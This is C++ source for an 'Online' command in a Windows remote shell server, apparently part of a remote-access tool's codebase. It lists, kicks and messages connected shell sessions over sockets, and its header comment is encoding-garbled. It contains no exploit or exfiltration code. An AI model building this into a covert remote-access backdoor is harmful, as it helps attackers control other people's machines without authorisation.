/*
����shell�������û�
*/
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include "..\zxsCommon\SocketList.h"
#include "ShellLog.h"

SHELLLOG ShellOnline;

int KillOnline(MainPara *args)
{
	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();
	SOCKET Socket = args->Socket;
	char *Usage = ""
		"Online -k -ip <IP> -socket <Socket>\r\n"
		"Online -k -ip 61.1.1.1\r\n"
		"Online -k -socket 1824\r\n";
	if(argc < 4)
	{
		SendMessage(Socket, Usage);
		return 0;
	}
	if(!stricmp(argv[2], "-ip"))
	{
		ShellOnline.KillClientByIP(Socket, argv[3]);
	}else if(!stricmp(argv[2], "-socket"))
	{
		ShellOnline.KillClientBySocket(Socket, atoi(argv[3]));
	}else
	{
		SendMessage(Socket, Usage);
		return 0;
	}
	return 1;
}

int SendMsg(MainPara *args)
{
	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();
	SOCKET Socket = args->Socket;
	char *Usage = ""
		"Online -sendto <Socket> [message content]\r\n"
		"Online -sendto 1824 \"who is that?\"\r\n"
		"Online -sendto * \"Hello\"\r\n";
	if(argc < 4 || stricmp(argv[1], "-sendto"))
	{
		SendMessage(Socket, Usage);
		return 0;
	}
	ShellOnline.SendMsgToSession(Socket, argv[2], argv[3]);
	return 1;
}
int Online(MainPara *args)
{
	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();
	SOCKET Socket = args->Socket;

	char *Usage = ""
		"USAGE: Online [-l] [-k] < IP|Socket >\r\n"
		"          -l   List All The Online User.\r\n"
		"          -k   Kick A Session.\r\n"
		"          -sendto    Send a message to other session.\r\n"
		"Example: Online -l\r\n"
		"         Online -k\r\n"
		"         Online -sendto\r\n\r\n";

	if(argc < 2)
	{
		SendMessage(Socket, Usage);
		return 0;
	}
	BOOL bError = FALSE;
	for(int i=1; i<argc; i++)
	{
		if(argv[i][0] == '-')
		{
			if(!stricmp(argv[i]+1, "l"))
			{
				ShellOnline.ListShellOnline(Socket);
				return 0;
			}else if(!stricmp(argv[i]+1, "k"))
			{
				KillOnline(args);
				return 0;
			}else if(!stricmp(argv[i]+1, "sendto"))
			{
				SendMsg(args);
				return 0;
			}

		} 

	}
	if(!bError)
		SendMessage(Socket, Usage);

	return 0;
}